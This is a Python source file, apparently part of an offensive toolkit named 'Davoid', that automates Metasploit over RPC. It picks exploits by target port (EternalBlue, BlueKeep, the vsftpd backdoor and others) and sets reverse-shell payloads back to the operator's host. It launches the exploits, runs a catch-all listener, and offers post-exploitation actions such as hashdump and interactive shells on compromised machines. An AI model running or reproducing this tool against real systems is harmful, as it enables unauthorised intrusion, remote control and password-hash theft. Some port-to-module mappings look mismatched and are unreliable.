import os
import sys
import time
import subprocess
import socket
import string
import random
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    pass

console = Console()


class MetasploitRPCEngine:
    def __init__(self):
        self.client = None
        self.daemon_process = None
        self.password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self.rpc_port = 55554
        self.msfrpcd_path = self.find_msfrpcd()

    def find_msfrpcd(self):
        """Locates the msfrpcd executable on the system, bypassing sudo PATH issues."""
        common_paths = [
            "/opt/metasploit-framework/bin/msfrpcd",  # Official installer
            "/opt/homebrew/bin/msfrpcd",              # Apple Silicon Mac
            "/usr/local/bin/msfrpcd",                 # Intel Mac
            "/usr/bin/msfrpcd"                        # Kali Linux default
        ]

        try:
            path = subprocess.run(
                ['which', 'msfrpcd'], capture_output=True, text=True).stdout.strip()
            if os.path.exists(path):
                return path
        except:
            pass

        for p in common_paths:
            if os.path.exists(p):
                return p

        return None

    def check_dependencies(self):
        try:
            import pymetasploit3
        except ImportError:
            console.print(
                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
            return False

        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] Metasploit Framework ('msfrpcd') not found on this system![/bold red]")
            console.print(
                "[yellow]Please ensure Metasploit is installed and accessible.[/yellow]")
            return False

        return True

    def is_port_open(self, port):
        """Checks if a local port is listening."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', port)) == 0

    def kill_stuck_daemon(self):
        """Cross-platform method to forcefully free the RPC port."""
        if sys.platform == "darwin":  # macOS
            os.system(
                f"lsof -ti:{self.rpc_port} | xargs kill -9 > /dev/null 2>&1")
        else:  # Linux
            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")

    def start_daemon(self):
        """Silently boots the Metasploit RPC server in the background."""
        if self.is_port_open(self.rpc_port):
            self.kill_stuck_daemon()
            time.sleep(1)

        with console.status("[bold cyan]Booting Headless Metasploit Engine (This takes ~10-15 seconds)...[/bold cyan]", spinner="bouncingBar"):
            cmd = [self.msfrpcd_path, "-P", self.password, "-n",
                   "-f", "-a", "127.0.0.1", "-p", str(self.rpc_port)]
            self.daemon_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            for _ in range(40):
                if self.is_port_open(self.rpc_port):
                    time.sleep(3)
                    return True
                time.sleep(1)

        return False

    def connect_rpc(self):
        """Connects Davoid to the newly spawned MSF Daemon."""
        if self.client:
            return True

        if not self.start_daemon():
            console.print(
                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed correctly.[/bold red]")
            return False

        console.print("[*] Negotiating API connection...")
        try:
            self.client = MsfRpcClient(
                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
            console.print(
                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
            time.sleep(1)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
            return False

    def search_modules(self):
        """Pro Feature: Search Metasploit database from within Davoid."""
        keyword = questionary.text(
            "Enter search keyword (e.g., vsftpd, eternalblue, smb):", style=Q_STYLE).ask()
        if not keyword:
            return

        with console.status(f"[bold cyan]Querying Metasploit Database for '{keyword}'...[/bold cyan]", spinner="dots"):
            try:
                msf_console = self.client.consoles.console()
                msf_console.write(f"search {keyword}\n")

                raw_data = ""
                # Smart sync: Wait until the MSF console reports it is no longer busy
                for _ in range(20):
                    time.sleep(1)
                    out = msf_console.read()
                    if out and out.get('data'):
                        raw_data += out['data']
                    if out and out.get('busy') is False:
                        break

                if raw_data:
                    lines = raw_data.split('\n')
                    if len(lines) > 50:
                        raw_data = '\n'.join(
                            lines[:50]) + "\n\n... [Truncated for readability. Be more specific.]"

                    console.print(
                        Panel(raw_data, title=f"Search Results: {keyword}", border_style="cyan"))
                else:
                    console.print(
                        "[yellow][!] No modules found or search timed out.[/yellow]")
            except Exception as e:
                console.print(f"[red][!] Search failed: {e}[/red]")

    def auto_exploit(self):
        """Pro Tier: Dynamically queries the MSF DB based on the port and auto-suggests the highest-ranked exploits."""
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        rport_input = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_input:
            return
        rport = int(rport_input)

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()

        # Extensive Best-in-Class Fallback Dictionary for standard ports
        port_exploits = {
            21: "unix/ftp/vsftpd_234_backdoor",
            22: "linux/ssh/exim_pe_injection",
            23: "unix/telnet/telnet_login",
            25: "unix/smtp/exim4_string_format",
            80: "multi/http/apache_normalize_path_rce",
            139: "multi/samba/usermap_script",
            445: "windows/smb/ms17_010_eternalblue",
            3306: "linux/mysql/mysql_yassl_getali",
            3389: "windows/rdp/cve_2019_0708_bluekeep_rce",
            6200: "unix/misc/distcc_exec",
            8080: "multi/http/tomcat_mgr_upload"
        }

        # --- PRO FEATURE: Dynamic Intelligence Engine & Ranking ---
        parsed_modules = []
        raw_data = ""
        rank_scores = {
            "excellent": 7, "great": 6, "good": 5,
            "normal": 4, "average": 3, "low": 2, "manual": 1
        }

        try:
            msf_console = self.client.consoles.console()
            msf_console.write(f"search port:{rport} type:exploit\n")

            with console.status(f"[bold cyan]Querying Database & Ranking Exploits for Port {rport}...[/bold cyan]", spinner="dots"):
                # Smart Sync: Poll until MSF finishes the database query
                for _ in range(20):
                    time.sleep(1)
                    out = msf_console.read()
                    if out and out.get('data'):
                        raw_data += out['data']
                    if out and out.get('busy') is False:
                        break

            if raw_data:
                display_lines = []
                for line in raw_data.splitlines():
                    if "Name" in line and "Disclosure" in line:
                        display_lines.append(line)
                    elif "----" in line or "====" in line:
                        display_lines.append(line)
                    elif "exploit/" in line:
                        display_lines.append(line)

                        # Extract the exact path and its rank
                        parts = line.split()
                        mod_path = next(
                            (p for p in parts if p.startswith("exploit/")), None)
                        rank = next((r for r in rank_scores.keys()
                                    if r in line.lower()), "normal")

                        if mod_path:
                            # Strip 'exploit/' prefix to ensure flawless execution in older MSF versions
                            clean_path = mod_path.replace("exploit/", "", 1)
                            parsed_modules.append({
                                'path': clean_path,
                                'rank': rank,
                                'score': rank_scores[rank]
                            })

                if parsed_modules:
                    console.print(Panel("\n".join(
                        display_lines[:25]), title=f"Top Vulnerabilities for Port {rport}", border_style="green"))
                    if len(display_lines) > 25:
                        console.print(
                            "[dim]... [Truncated. Showing top results only] ...[/dim]")
                else:
                    console.print(
                        f"[yellow][-] No direct port-matched exploits found for {rport} in the MSF Database.[/yellow]")
        except Exception as e:
            console.print(f"[dim red]Module search error: {e}[/dim red]")

        # --- SMART DROPDOWN SELECTION (Sorted by Reliability) ---
        custom_mod = ""
        fallback_mod = port_exploits.get(rport, "")

        if parsed_modules:
            # Sort the discovered modules by their Rank Score (Highest to lowest)
            parsed_modules.sort(key=lambda x: x['score'], reverse=True)

            choices = [
                f"[{m['rank'].upper()}] {m['path']}" for m in parsed_modules[:15]]
            choices.append(questionary.Separator())
            choices.append("Manual Entry (Type it yourself)")

            selected = questionary.select(
                "Select Exploit Module (Sorted by Reliability):",
                choices=choices,
                style=Q_STYLE
            ).ask()

            if selected == "Manual Entry (Type it yourself)":
                custom_mod = questionary.text(
                    f"Enter Exploit Module (Default: {fallback_mod}):", default=fallback_mod, style=Q_STYLE).ask()
            elif selected:
                # Strip the "[EXCELLENT] " tag to get the pure module path
                custom_mod = selected.split("] ")[1].strip()
        else:
            custom_mod = questionary.text(
                f"Enter Exploit Module manually (Default: {fallback_mod}):", default=fallback_mod, style=Q_STYLE).ask()

        if not custom_mod:
            return

        # --- SMART PAYLOAD GUESSER ---
        # Automatically select the mathematically most likely payload to succeed based on the exploit string
        default_payload = "windows/x64/meterpreter/reverse_tcp"
        mod_lower = custom_mod.lower()

        if "windows" in mod_lower:
            default_payload = "windows/x64/meterpreter/reverse_tcp"
        elif "linux" in mod_lower:
            default_payload = "linux/x86/meterpreter/reverse_tcp"
        elif "osx" in mod_lower or "apple" in mod_lower:
            default_payload = "osx/x64/meterpreter_reverse_tcp"
        elif any(x in mod_lower for x in ["unix", "ftp", "telnet", "vsftpd", "samba"]):
            # Specific logic for common bind/interact shells
            if "samba" in mod_lower:
                default_payload = "cmd/unix/reverse_netcat"
            else:
                default_payload = "cmd/unix/interact"

        payload_choices = [
            "windows/x64/meterpreter/reverse_tcp",
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "cmd/unix/interact",
            "cmd/unix/reverse_netcat",
            "php/meterpreter/reverse_tcp",
            "java/jsp_shell_reverse_tcp",
            "osx/x64/meterpreter_reverse_tcp",
            questionary.Separator(),
            "Custom (Type it manually)"
        ]

        custom_payload = questionary.select(
            f"Select Payload (Auto-Suggested for {custom_mod.split('/')[0]}):",
            choices=payload_choices,
            default=default_payload if default_payload in payload_choices else None,
            style=Q_STYLE
        ).ask()

        if custom_payload == "Custom (Type it manually)":
            custom_payload = questionary.text(
                "Enter exact MSF Payload path:", default=default_payload, style=Q_STYLE).ask()

        if not custom_payload:
            return

        console.print(Panel(
            f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}\n[white]Payload:[/white] {custom_payload}", border_style="red"))

        try:
            msf_console = self.client.consoles.console()
            msf_console.write(f"use {custom_mod}\n")
            time.sleep(0.5)

            # Use SETG (Set Global) to silently force variables into the MSF memory space.
            msf_console.write(f"setg RHOSTS {target}\n")
            msf_console.write(f"setg RHOST {target}\n")
            msf_console.write(f"setg RPORT {rport}\n")
            msf_console.write(f"setg LHOST {lhost}\n")
            msf_console.write(f"setg LPORT 4444\n")
            msf_console.write(f"set PAYLOAD {custom_payload}\n")

            if "local" in custom_mod or "pe_injection" in custom_mod:
                console.print(
                    "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
                sess_id = questionary.text(
                    "Enter the active SESSION ID to upgrade:", style=Q_STYLE).ask()
                if sess_id:
                    msf_console.write(f"set SESSION {sess_id}\n")

            msf_console.write("exploit -j -z\n")

            db.log("MSF-Engine", target,
                   f"Attempted {custom_mod} via Console", "INFO")

            console_output = ""
            with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
                # Poll for up to 15 seconds (10 iterations * 1.5s)
                for _ in range(10):
                    time.sleep(1.5)
                    out = msf_console.read()
                    if out and out.get('data'):
                        console_output += out['data']
                        if any(x in out['data'] for x in ["Exploit completed", "session", "failed", "Command shell", "found"]):
                            break

            if console_output.strip():
                console.print(f"\n[dim]{console_output.strip()}[/dim]")

            with console.status("[bold cyan]Verifying session status...[/bold cyan]", spinner="bouncingBar"):
                session_found = False
                for _ in range(4):
                    time.sleep(2)
                    sessions = self.client.sessions.list
                    if sessions:
                        console.print(
                            f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 4 to interact.[/bold green]")
                        db.log("MSF-Engine", target,
                               f"Successful Exploit: {custom_mod}", "CRITICAL")
                        session_found = True
                        break

                if not session_found:
                    console.print(
                        "\n[yellow][-] No session established yet. The exploit may have failed, the target isn't vulnerable, or it needs more time.[/yellow]")

        except Exception as e:
            console.print(
                f"[bold red][!] Exploit execution failed:[/bold red] {e}")

    def list_sessions(self):
        """Pulls live session data from the Metasploit Daemon."""
        sessions = self.client.sessions.list

        if not sessions:
            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
            return False

        table = Table(title="Active MSF Sessions (RPC)",
                      border_style="green", expand=True)
        table.add_column("ID", style="cyan", justify="center")
        table.add_column("Type", style="magenta")
        table.add_column("Target IP", style="white")
        table.add_column("Details", style="dim")

        for session_id, data in sessions.items():
            table.add_row(
                str(session_id),
                data.get('type', 'Unknown'),
                data.get('target_host', 'Unknown'),
                data.get('info', 'No Info')
            )

        console.print(table)
        return True

    def manage_jobs(self):
        """Pro Feature: Background Job Manager"""
        jobs = self.client.jobs.list
        if not jobs:
            console.print("[yellow][!] No background jobs running.[/yellow]")
            return

        table = Table(title="Active MSF Background Jobs",
                      border_style="blue", expand=True)
        table.add_column("Job ID", style="cyan", justify="center")
        table.add_column("Job Name", style="white")

        for jid, jname in jobs.items():
            table.add_row(str(jid), jname)

        console.print(table)

        target_job = questionary.text(
            "Enter Job ID to kill (or leave blank to cancel):", style=Q_STYLE).ask()
        if target_job and target_job in jobs:
            try:
                self.client.jobs.stop(target_job)
                console.print(
                    f"[bold green][+] Job {target_job} terminated successfully.[/bold green]")
            except Exception as e:
                console.print(f"[red][!] Failed to kill job: {e}[/red]")

    def interact_session(self):
        """Opens an interactive terminal to an active Metasploit session."""
        if not self.list_sessions():
            return

        session_id = questionary.text(
            "Enter Session ID to interact with (or leave blank to cancel):", style=Q_STYLE).ask()

        if not session_id:
            return

        sessions = self.client.sessions.list
        if session_id not in sessions:
            console.print("[bold red][!] Invalid Session ID.[/bold red]")
            return

        session_type = sessions[session_id].get('type', 'Unknown')
        shell = self.client.sessions.session(session_id)

        # Pro Feature: Automated Post-Exploitation Quick Actions
        if session_type == 'meterpreter':
            quick_action = questionary.select(
                "Meterpreter Quick Actions:",
                choices=[
                    "1. Drop into Interactive Shell",
                    "2. Run 'sysinfo' and 'getuid'",
                    "3. Attempt Hashdump"
                ],
                style=Q_STYLE
            ).ask()

            if quick_action and "sysinfo" in quick_action:
                console.print("[cyan][*] Gathering system info...[/cyan]")
                console.print(shell.run_with_output('sysinfo'))
                console.print(shell.run_with_output('getuid'))
            elif quick_action and "Hashdump" in quick_action:
                console.print(
                    "[cyan][*] Attempting to dump password hashes...[/cyan]")
                console.print(shell.run_with_output('hashdump'))

        console.print(Panel(
            f"[bold green][+] Interacting with {session_type.capitalize()} Session {session_id}[/bold green]\n"
            f"[dim]Type 'exit', 'quit', or 'background' to return to Davoid.[/dim]",
            border_style="green"
        ))

        while True:
            try:
                cmd = questionary.text(
                    f"{session_type.capitalize()} {session_id} >", style=Q_STYLE).ask()

                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit', 'background']:
                    break

                if session_type == 'meterpreter':
                    output = shell.run_with_output(cmd)
                    if output:
                        console.print(f"[white]{output}[/white]")
                else:
                    shell.write(cmd + '\n')
                    time.sleep(1.5)
                    output = shell.read()
                    if output:
                        console.print(f"[white]{output}[/white]")

            except KeyboardInterrupt:
                console.print(
                    "\n[yellow][*] Backgrounding session...[/yellow]")
                break
            except Exception as e:
                console.print(
                    f"[bold red][!] Error interacting with session:[/bold red] {e}")
                break

    def cleanup(self):
        """Kills the background daemon when leaving the module."""
        if self.daemon_process:
            console.print(
                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
            self.daemon_process.terminate()
            self.kill_stuck_daemon()  # Ensure it is completely dead

    def run(self):
        draw_header("Metasploit RPC Orchestrator")

        if not self.check_dependencies():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        if not self.connect_rpc():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        try:
            while True:
                choice = questionary.select(
                    "MSF-RPC Operations:",
                    choices=[
                        "1. Auto-Exploit Target",
                        "2. Search MSF Modules (Exploit Database)",
                        "3. Start Generic Catch-All Listener (Multi/Handler)",
                        "4. Active Sessions & Post-Exploitation",
                        "5. Manage Background Jobs",
                        "Back"
                    ], style=Q_STYLE
                ).ask()

                if not choice or choice == "Back":
                    break
                elif "Auto-Exploit" in choice:
                    self.auto_exploit()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Search MSF" in choice:
                    self.search_modules()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Active Sessions" in choice:
                    self.interact_session()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Manage Background" in choice:
                    self.manage_jobs()
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                elif "Listener" in choice:
                    lhost = ctx.get("LHOST") or "0.0.0.0"
                    lport = questionary.text(
                        "LPORT:", default="4444", style=Q_STYLE).ask()

                    payload_choices = [
                        "windows/x64/meterpreter/reverse_tcp",
                        "windows/meterpreter/reverse_tcp",
                        "linux/x64/meterpreter/reverse_tcp",
                        "linux/x86/meterpreter/reverse_tcp",
                        "cmd/unix/interact",
                        "php/meterpreter/reverse_tcp",
                        questionary.Separator(),
                        "Custom (Type it manually)"
                    ]

                    payload = questionary.select(
                        "Select Payload for Listener:",
                        choices=payload_choices,
                        style=Q_STYLE
                    ).ask()

                    if payload == "Custom (Type it manually)":
                        payload = questionary.text(
                            "Enter exact MSF Payload path:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()

                    if not payload:
                        continue

                    try:
                        msf_console = self.client.consoles.console()
                        msf_console.write("use exploit/multi/handler\n")
                        msf_console.write(f"set PAYLOAD {payload}\n")

                        msf_console.write(f"setg LHOST {lhost}\n")
                        msf_console.write(f"setg LPORT {lport}\n")
                        msf_console.write("exploit -j -z\n")

                        console.print(
                            "[bold green][+] Listener started in background (Check Jobs menu).[/bold green]")

                        time.sleep(2)
                        output = msf_console.read()
                        if output and output.get('data'):
                            console.print(
                                f"\n[dim]{output['data'].strip()}[/dim]")

                    except Exception as e:
                        console.print(
                            f"[red][!] Failed to start listener: {e}[/red]")
                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
        finally:
            self.cleanup()


def run_msf():
    engine = MetasploitRPCEngine()
    engine.run()


if __name__ == "__main__":
    run_msf()
